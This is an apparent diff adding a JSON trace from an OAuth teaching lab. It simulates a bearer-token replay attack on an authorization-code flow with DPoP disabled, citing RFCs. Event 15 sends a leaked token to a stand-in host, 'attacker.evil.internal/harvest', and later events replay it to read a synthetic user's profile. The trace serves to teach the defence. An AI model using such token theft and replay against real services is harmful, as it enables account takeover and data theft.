@@ -1,0 +1,814 @@
+{
+  "correlation_id": "run_5ofrIznvT6qNJVUf4RzI5Izibq_PbE9zm6L3RiUTUS0",
+  "config": {
+    "grant": "authorization_code",
+    "capabilities": {
+      "dpop": {
+        "active": false,
+        "params": {}
+      }
+    },
+    "attacks": {
+      "token_replay": {
+        "active": true,
+        "params": {}
+      }
+    }
+  },
+  "verdict": {
+    "attacker_got_token": true,
+    "user_got_token": true,
+    "user_accessed_resource": true,
+    "one_line": "User obtained an access token: YES \u2014 the client completed the flow and read the resource. Attacker replayed the stolen token: YES \u2014 the token is a plain bearer token, so possession is all the resource server requires and the attacker reads the victim's resource (RFC 6750). Sender-constraining the token (DPoP) is what closes this.",
+    "responsible_capabilities": []
+  },
+  "events": [
+    {
+      "seq": 1,
+      "actor": "client",
+      "on_behalf_of": "user",
+      "phase": "authorize",
+      "summary": "Client starts the authorization-code flow.",
+      "detail": "The client builds an authorization request and redirects the user's browser to the authorization server. It asks for an authorization 'code' (not a token directly) and includes a 'state' value to tie the eventual response back to this browser session.",
+      "outcome": "ok",
+      "refs": [],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://auth.oauthlab.internal/oauth/authorize",
+          "headers": {},
+          "body": {
+            "response_type": "code",
+            "client_id": "demo-native-app",
+            "redirect_uri": "https://spa.oauthlab.internal/callback",
+            "scope": "profile email",
+            "state": "st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs"
+          }
+        },
+        "response": {
+          "status": 302,
+          "headers": {},
+          "body": {
+            "redirecting_to": "authorization_server"
+          }
+        },
+        "highlight": [
+          "request.body.response_type",
+          "request.body.state"
+        ],
+        "source_actor": "client",
+        "target_actor": "auth_server"
+      },
+      "knowledge_delta": {
+        "client": {
+          "has": [
+            "state",
+            "redirect_uri",
+            "client_id"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.1"
+        }
+      ]
+    },
+    {
+      "seq": 2,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "authorize",
+      "summary": "Authorization server receives the authorization request.",
+      "detail": "The user's browser arrives at the authorization endpoint carrying the client's request. The server checks that the client is registered, that the redirect URI exactly matches one it registered, and that the response type is 'code' for the authorization-code grant.",
+      "outcome": "ok",
+      "refs": [
+        1
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://auth.oauthlab.internal/oauth/authorize",
+          "headers": {
+            "Host": "auth.oauthlab.internal"
+          },
+          "body": {
+            "response_type": "code",
+            "client_id": "demo-native-app",
+            "redirect_uri": "https://spa.oauthlab.internal/callback",
+            "scope": "profile email",
+            "state": "st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs"
+          }
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "page": "login_and_consent"
+          }
+        },
+        "highlight": [
+          "request.body.client_id",
+          "request.body.redirect_uri",
+          "request.body.response_type"
+        ],
+        "source_actor": "client",
+        "target_actor": "auth_server"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.1"
+        }
+      ]
+    },
+    {
+      "seq": 3,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "authorize",
+      "summary": "Authorization server checks client registration and redirect URI.",
+      "detail": "The server confirms the client_id is registered and that the requested redirect URI exactly matches one registered for that client, so the code can only be delivered to the client's own endpoint.",
+      "outcome": "ok",
+      "refs": [
+        2
+      ],
+      "check": {
+        "name": "redirect_uri_registered",
+        "rule": "client_id is registered AND redirect_uri exactly matches a registered URI",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 6749",
+          "section": "\u00a73.1.2"
+        },
+        "expected": "registered client + exact redirect_uri match",
+        "actual": "registered client + exact match"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a73.1.2"
+        }
+      ]
+    },
+    {
+      "seq": 4,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "authorize",
+      "summary": "User authenticates and consents to the requested scope.",
+      "detail": "The synthetic user 'avery' logs in and approves the client's request for scope 'profile email'. No real credentials or PII are involved; the account is bundled with the tool.",
+      "outcome": "ok",
+      "refs": [
+        3
+      ],
+      "http": {
+        "request": {
+          "method": "POST",
+          "url": "https://auth.oauthlab.internal/login",
+          "headers": {},
+          "body": {
+            "username": "avery",
+            "consent": "approve",
+            "scope": "profile email"
+          }
+        },
+        "response": {
+          "status": 302,
+          "headers": {},
+          "body": {
+            "consent": "granted"
+          }
+        },
+        "highlight": [
+          "request.body.consent"
+        ],
+        "source_actor": "auth_server",
+        "target_actor": "auth_server"
+      },
+      "knowledge_delta": {
+        "auth_server": {
+          "has": [
+            "user_session",
+            "consent"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.1"
+        }
+      ]
+    },
+    {
+      "seq": 5,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "redirect",
+      "summary": "Authorization server redirects back with a single-use code.",
+      "detail": "The server issues a short-lived, single-use authorization code and redirects the browser to the client's registered redirect URI, echoing the 'state' value unchanged. The code is bound server-side to this client and redirect URI; it is not itself a token.",
+      "outcome": "ok",
+      "refs": [
+        2
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://spa.oauthlab.internal/callback",
+          "headers": {}
+        },
+        "response": {
+          "status": 302,
+          "headers": {
+            "Location": "https://spa.oauthlab.internal/callback?code=ac_CBEh_XCXQaWiDrPsP8IaayQUvLV6qEQyg0hFrBGdwJM&state=st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs"
+          },
+          "body": {
+            "code": "ac_CBEh_XCXQaWiDrPsP8IaayQUvLV6qEQyg0hFrBGdwJM",
+            "state": "st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs"
+          }
+        },
+        "highlight": [
+          "response.body.code",
+          "response.body.state"
+        ],
+        "source_actor": "auth_server",
+        "target_actor": "client"
+      },
+      "knowledge_delta": {
+        "auth_server": {
+          "has": [
+            "authorization_code"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.2"
+        }
+      ]
+    },
+    {
+      "seq": 6,
+      "actor": "client",
+      "on_behalf_of": "user",
+      "phase": "redirect",
+      "summary": "Client receives the authorization code on its redirect URI.",
+      "detail": "The browser lands back on the client's redirect URI carrying the code and the echoed 'state'. The client confirms the 'state' matches the one it generated, so the response belongs to the session it started.",
+      "outcome": "ok",
+      "refs": [
+        1
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://spa.oauthlab.internal/callback?code=ac_CBEh_XCXQaWiDrPsP8IaayQUvLV6qEQyg0hFrBGdwJM&state=st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs",
+          "headers": {}
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "state_valid": true
+          }
+        },
+        "highlight": [
+          "response.body.state_valid"
+        ],
+        "source_actor": "client",
+        "target_actor": "client"
+      },
+      "check": {
+        "name": "state_matches_session",
+        "rule": "returned state == state the client generated",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 6749",
+          "section": "\u00a710.12"
+        },
+        "expected": "st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs",
+        "actual": "st_Gq2Lv3eGS_WBWf8t2pCub2ZCNmvxlEGVnK0sIagPHZs"
+      },
+      "knowledge_delta": {
+        "client": {
+          "has": [
+            "authorization_code"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.2"
+        }
+      ]
+    },
+    {
+      "seq": 7,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Token endpoint receives the code exchange.",
+      "detail": "The caller presents the authorization code over the back channel to exchange it for a token. This is a public client, so there are no client credentials to present; the server will redeem the code subject to the checks that do apply.",
+      "outcome": "ok",
+      "refs": [
+        6
+      ],
+      "http": {
+        "request": {
+          "method": "POST",
+          "url": "https://auth.oauthlab.internal/oauth/token",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "body": {
+            "grant_type": "authorization_code",
+            "code": "ac_CBEh_XCXQaWiDrPsP8IaayQUvLV6qEQyg0hFrBGdwJM",
+            "redirect_uri": "https://spa.oauthlab.internal/callback",
+            "client_id": "demo-native-app"
+          }
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "processing": true
+          }
+        },
+        "highlight": [
+          "request.body.code",
+          "request.body.grant_type"
+        ],
+        "source_actor": "client",
+        "target_actor": "auth_server"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.3"
+        }
+      ]
+    },
+    {
+      "seq": 8,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Public client presents no secret (no client authentication).",
+      "detail": "This is a public client (a native app or SPA): it registered with token_endpoint_auth_method=none and holds no client secret. The token endpoint therefore performs no client authentication \u2014 a public client_id is not a secret, so anyone can present it. Client authentication is not a gate here; whether a captured code can be redeemed comes down to PKCE.",
+      "outcome": "ok",
+      "refs": [
+        7
+      ],
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a72.1"
+        },
+        {
+          "rfc": "RFC 7636",
+          "section": "\u00a71"
+        }
+      ]
+    },
+    {
+      "seq": 9,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Authorization code is redeemed exactly once.",
+      "detail": "The server looks up the code, confirms it exists and has not been redeemed before, and marks it used. A code that is missing or already redeemed is rejected \u2014 this is what makes a captured code single-use.",
+      "outcome": "ok",
+      "refs": [
+        5,
+        7
+      ],
+      "check": {
+        "name": "authorization_code_single_use",
+        "rule": "code exists AND not previously redeemed",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.2"
+        },
+        "expected": "unredeemed code",
+        "actual": "unredeemed code"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.2"
+        }
+      ]
+    },
+    {
+      "seq": 10,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Authorization code binding is verified (client + redirect URI).",
+      "detail": "The server confirms the code was issued to this client and for this redirect URI. A code captured by a different client, or presented with a different redirect URI, is rejected here.",
+      "outcome": "ok",
+      "refs": [
+        5,
+        7
+      ],
+      "check": {
+        "name": "authorization_code_binding",
+        "rule": "stored.client_id == client_id AND stored.redirect_uri == redirect_uri",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.3"
+        },
+        "expected": "code bound to this client and redirect_uri",
+        "actual": "binding matches"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.3"
+        }
+      ]
+    },
+    {
+      "seq": 11,
+      "actor": "auth_server",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Authorization server issues a signed JWT access token.",
+      "detail": "The code is valid and now spent. The server signs a real RS256 JWT access token with its private key, scoped to the resource server's audience, and returns it to the caller. The public key is available at the JWKS endpoint for verification.",
+      "outcome": "ok",
+      "refs": [
+        10
+      ],
+      "http": {
+        "request": {
+          "method": "POST",
+          "url": "https://auth.oauthlab.internal/oauth/token",
+          "headers": {}
+        },
+        "response": {
+          "status": 200,
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "body": {
+            "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFzLTIwMjYtMDkiLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGgub2F1dGhsYWIuaW50ZXJuYWwiLCJzdWIiOiJ1c2VyLThmMzFjMiIsImF1ZCI6Imh0dHBzOi8vYXBpLm9hdXRobGFiLmludGVybmFsIiwiY2xpZW50X2lkIjoiZGVtby1uYXRpdmUtYXBwIiwic2NvcGUiOiJwcm9maWxlIGVtYWlsIiwiaWF0IjoxNzg5MzQzNzA4LCJuYmYiOjE3ODkzNDM3MDgsImV4cCI6MTc4OTM0NDAwOCwianRpIjoiZWRlYTdmNWJhZjFiNDk4ZmI4ZmNmYTVlNmJkYjdhNWEifQ.fgn_LqrDWOJRrvGwvBe5NqUF5dizZGihSN6X27jwmrLkvt3EZqO9xbO9UR_lcuG_TKGSHZ2Ksdm1GvecQWzgSWKwN9mzV--ONP3P-eGIOSdQhrbOF3EMhD6ATI0lr0lOWoPgl7gzVt3stsmcSD5wuwct9kN5OoiSK7sP6Qch4Z_SHlLpqTnAbqp-d0mxrI828izAxyxfYFiK4SaGbdeuhaoGLOizaWW80BZjZM5ccgNu0VUSNjVg_lJCTsBpEolHL6bfKPDYSfmoLNypJfJ1MToQVDZVM_Gt1aFcApu-fMg6vLDPiK47y0VMTSUIFAkb4t7VSA_77j0QHcQR4gQptQ",
+            "token_type": "Bearer",
+            "expires_in": 300,
+            "scope": "profile email"
+          }
+        },
+        "highlight": [
+          "response.body.access_token",
+          "response.body.token_type"
+        ],
+        "source_actor": "auth_server",
+        "target_actor": "client"
+      },
+      "knowledge_delta": {
+        "auth_server": {
+          "has": [
+            "access_token"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.4"
+        }
+      ]
+    },
+    {
+      "seq": 12,
+      "actor": "client",
+      "on_behalf_of": "user",
+      "phase": "token",
+      "summary": "Client receives and stores the access token.",
+      "detail": "The token exchange succeeds. The client now holds a signed, audience-scoped access token it can present to the resource server on the user's behalf.",
+      "outcome": "ok",
+      "refs": [
+        11
+      ],
+      "knowledge_delta": {
+        "client": {
+          "has": [
+            "access_token"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a74.1.4"
+        }
+      ]
+    },
+    {
+      "seq": 13,
+      "actor": "resource_server",
+      "on_behalf_of": "user",
+      "phase": "resource",
+      "summary": "Resource server validates the access token.",
+      "detail": "The resource server verifies the JWT's signature against the authorization server's published JWKS and checks the expiry, issuer, audience, and token type (typ=at+jwt). Only a token that passes every check is honored.",
+      "outcome": "ok",
+      "refs": [
+        12
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://api.oauthlab.internal/userinfo",
+          "headers": {
+            "Authorization": "Bearer <access_token>"
+          }
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "validated": true
+          }
+        },
+        "highlight": [
+          "request.headers.Authorization"
+        ],
+        "source_actor": "client",
+        "target_actor": "resource_server"
+      },
+      "check": {
+        "name": "access_token_validation",
+        "rule": "verify JWS signature via JWKS AND check exp/iss/aud/typ",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 9068",
+          "section": "\u00a74"
+        },
+        "expected": "valid signature, unexpired, aud=resource server, typ=at+jwt",
+        "actual": "all checks passed"
+      },
+      "knowledge_delta": {
+        "resource_server": {
+          "has": [
+            "verified_token_claims"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a77"
+        },
+        {
+          "rfc": "RFC 9068",
+          "section": "\u00a74"
+        }
+      ]
+    },
+    {
+      "seq": 14,
+      "actor": "resource_server",
+      "on_behalf_of": "user",
+      "phase": "resource",
+      "summary": "Resource server returns the protected resource.",
+      "detail": "Token validated. The resource server returns the protected profile resource for the subject named in the token, completing the flow: the user has authorized the client and the client has accessed the API.",
+      "outcome": "ok",
+      "refs": [
+        13
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://api.oauthlab.internal/userinfo",
+          "headers": {}
+        },
+        "response": {
+          "status": 200,
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "body": {
+            "sub": "user-8f31c2",
+            "username": "avery",
+            "name": "Avery Diaz",
+            "email": "avery@oauthlab.internal",
+            "scope": "profile email"
+          }
+        },
+        "highlight": [
+          "response.body.sub",
+          "response.body.scope"
+        ],
+        "source_actor": "resource_server",
+        "target_actor": "client"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a77"
+        }
+      ]
+    },
+    {
+      "seq": 15,
+      "actor": "attacker",
+      "on_behalf_of": "user",
+      "phase": "resource",
+      "summary": "Attacker steals a copy of the access token.",
+      "detail": "The attacker obtains the raw access token the honest client was issued (via a proxy log, a compromised store, or an exfiltrating extension). Possessing the token bytes is enough to replay a plain bearer token; a DPoP-bound token additionally requires proving possession of the client's key, which the attacker does not hold.",
+      "outcome": "ok",
+      "refs": [
+        14
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://attacker.evil.internal/harvest",
+          "headers": {
+            "X-Observed": "leaked access token"
+          }
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "captured_token": "<access_token>"
+          }
+        },
+        "highlight": [
+          "response.body.captured_token"
+        ],
+        "source_actor": "client",
+        "target_actor": "attacker"
+      },
+      "knowledge_delta": {
+        "attacker": {
+          "has": [
+            "access_token"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 9449",
+          "section": "\u00a71"
+        }
+      ]
+    },
+    {
+      "seq": 16,
+      "actor": "resource_server",
+      "on_behalf_of": "attacker",
+      "phase": "resource",
+      "summary": "Resource server validates the access token.",
+      "detail": "The resource server verifies the JWT's signature against the authorization server's published JWKS and checks the expiry, issuer, audience, and token type (typ=at+jwt). Only a token that passes every check is honored.",
+      "outcome": "ok",
+      "refs": [
+        15
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://api.oauthlab.internal/userinfo",
+          "headers": {
+            "Authorization": "Bearer <access_token>"
+          }
+        },
+        "response": {
+          "status": 200,
+          "headers": {},
+          "body": {
+            "validated": true
+          }
+        },
+        "highlight": [
+          "request.headers.Authorization"
+        ],
+        "source_actor": "attacker",
+        "target_actor": "resource_server"
+      },
+      "check": {
+        "name": "access_token_validation",
+        "rule": "verify JWS signature via JWKS AND check exp/iss/aud/typ",
+        "result": "PASS",
+        "spec_ref": {
+          "rfc": "RFC 9068",
+          "section": "\u00a74"
+        },
+        "expected": "valid signature, unexpired, aud=resource server, typ=at+jwt",
+        "actual": "all checks passed"
+      },
+      "knowledge_delta": {
+        "resource_server": {
+          "has": [
+            "verified_token_claims"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a77"
+        },
+        {
+          "rfc": "RFC 9068",
+          "section": "\u00a74"
+        }
+      ]
+    },
+    {
+      "seq": 17,
+      "actor": "resource_server",
+      "on_behalf_of": "attacker",
+      "phase": "resource",
+      "summary": "Resource server returns the protected resource.",
+      "detail": "Token validated. The resource server returns the protected profile resource for the subject named in the token, completing the flow: the user has authorized the client and the client has accessed the API.",
+      "outcome": "ok",
+      "refs": [
+        16
+      ],
+      "http": {
+        "request": {
+          "method": "GET",
+          "url": "https://api.oauthlab.internal/userinfo",
+          "headers": {}
+        },
+        "response": {
+          "status": 200,
+          "headers": {
+            "Content-Type": "application/json"
+          },
+          "body": {
+            "sub": "user-8f31c2",
+            "username": "avery",
+            "name": "Avery Diaz",
+            "email": "avery@oauthlab.internal",
+            "scope": "profile email"
+          }
+        },
+        "highlight": [
+          "response.body.sub",
+          "response.body.scope"
+        ],
+        "source_actor": "resource_server",
+        "target_actor": "attacker"
+      },
+      "knowledge_delta": {},
+      "spec_refs": [
+        {
+          "rfc": "RFC 6749",
+          "section": "\u00a77"
+        }
+      ]
+    },
+    {
+      "seq": 18,
+      "actor": "attacker",
+      "on_behalf_of": "user",
+      "phase": "resource",
+      "summary": "Attacker reads the victim's resource with the stolen token.",
+      "detail": "The token is a plain bearer token, so the resource server requires nothing but possession. The attacker replays it from its own machine and the resource server returns the victim's protected data \u2014 a stolen bearer token works anywhere.",
+      "outcome": "attack_success",
+      "refs": [
+        17
+      ],
+      "knowledge_delta": {
+        "attacker": {
+          "has": [
+            "victim_resource"
+          ],
+          "lacks": []
+        }
+      },
+      "spec_refs": [
+        {
+          "rfc": "RFC 9449",
+          "section": "\u00a71"
+        }
+      ]
+    }
+  ],
+  "schema_version": "1.0",
+  "parent_id": null,
+  "chain_id": null
+}
